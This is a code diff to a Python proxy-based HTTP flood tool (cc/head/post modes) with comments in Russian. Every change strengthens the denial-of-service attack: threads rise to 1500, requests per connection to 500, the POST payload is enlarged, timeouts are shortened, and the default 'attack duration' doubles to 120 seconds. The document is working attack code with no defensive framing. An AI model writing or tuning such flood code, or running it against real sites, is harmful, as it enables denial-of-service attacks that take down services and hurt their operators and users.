@@ -83,7 +83,7 @@ url = ""
 proxy_ver = "5"
 brute = False
 out_file = "proxy.txt"
-thread_num = 800
+thread_num = 1500  # Увеличено количество потоков по умолчанию
 data = ""
 cookies = ""
 
@@ -171,7 +171,7 @@ def GenReqHeader(method):
         user_agent = "User-Agent: " + getuseragent() + "\r\n"
         accept = Choice(acceptall)
         if data == "":  
-            data = str(random._urandom(16))
+            data = str(random._urandom(1024))  # Увеличен размер данных для POST
         length = "Content-Length: " + str(len(data)) + " \r\nConnection: Keep-Alive\r\n"
         if cookies != "":
             length += "Cookies: " + str(cookies) + "\r\n"
@@ -241,7 +241,7 @@ def cc(event, proxy_type):
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             if brute:
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
-            s.settimeout(3)
+            s.settimeout(2)  # Уменьшен таймаут
             s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
@@ -249,7 +249,7 @@ def cc(event, proxy_type):
                 ctx.verify_mode = ssl.CERT_NONE
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
-                for _ in range(100):
+                for _ in range(500):  # Увеличено количество запросов на соединение
                     get_host = "GET " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                     request = get_host + header
                     sent = s.send(str.encode(request))
@@ -282,12 +282,13 @@ def head(event, proxy_type):
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             if brute:
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(2)  # Уменьшен таймаут
             s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
-                for _ in range(100):
+                for _ in range(500):  # Увеличено количество запросов на соединение
                     head_host = "HEAD " + path + add + randomurl() + " HTTP/1.1\r\nHost: " + target + "\r\n"
                     request = head_host + header
                     sent = s.send(str.encode(request))
@@ -315,12 +316,13 @@ def post(event, proxy_type):
                 s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
             if brute:
                 s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
+            s.settimeout(2)  # Уменьшен таймаут
             s.connect((str(target), int(port)))
             if protocol == "https":
                 ctx = ssl.SSLContext()
                 s = ctx.wrap_socket(s, server_hostname=target)
             try:
-                for _ in range(100):
+                for _ in range(500):  # Увеличено количество запросов на соединение
                     sent = s.send(str.encode(request))
                     if not sent:
                         proxy = Choice(proxies).strip().split(":")
@@ -550,7 +552,7 @@ def main():
     check_proxies = False
     download_socks = False
     proxy_type = 5
-    period = 60
+    period = 120  # Увеличен период атаки по умолчанию
     help = False
 
     print(fr"{red}> Mode:{reset} [cc/post/head]")
@@ -569,12 +571,12 @@ def main():
     brute = input(fr"{red}> Enable{reset} brute mode (1 for yes, 0 for no, default:0): ").strip()
     brute = brute == "1"
 
-    thread_num = input(fr"{red}> Enter{reset} number of threads (default:800): ").strip()
+    thread_num = input(fr"{red}> Enter{reset} number of threads (default:1500): ").strip()
     try:
-        thread_num = int(thread_num) if thread_num else 800
+        thread_num = int(thread_num) if thread_num else 1500
     except:
-        print(fr"{red}> Invalid{reset} number of threads. Using default 800.")
-        thread_num = 800
+        print(fr"{red}> Invalid{reset} number of threads. Using default 1500.")
+        thread_num = 1500
 
     cookies = input(fr"{red}> Enter{reset} cookies (optional): ").strip()
 
@@ -594,12 +596,12 @@ def main():
 
     check_proxies = input(fr"{red}> Check{reset} proxies? (y/n, default:n): ").strip().lower() == "y"
 
-    period = input(fr"{red}> Enter{reset} attack duration in seconds (default:60): ").strip()
+    period = input(fr"{red}> Enter{reset} attack duration in seconds (default:120): ").strip()
     try:
-        period = int(period) if period else 60
+        period = int(period) if period else 120
     except:
-        print(fr"{red}> Invalid{reset} duration. Using default 60 seconds.")
-        period = 60
+        print(fr"{red}> Invalid{reset} duration. Using default 120 seconds.")
+        period = 120
 
     if download_socks:
         DownloadProxies(proxy_ver)
@@ -654,4 +656,4 @@ def main():
 
 if __name__ == "__main__":
     bannerm()
-    main()  
+    main()
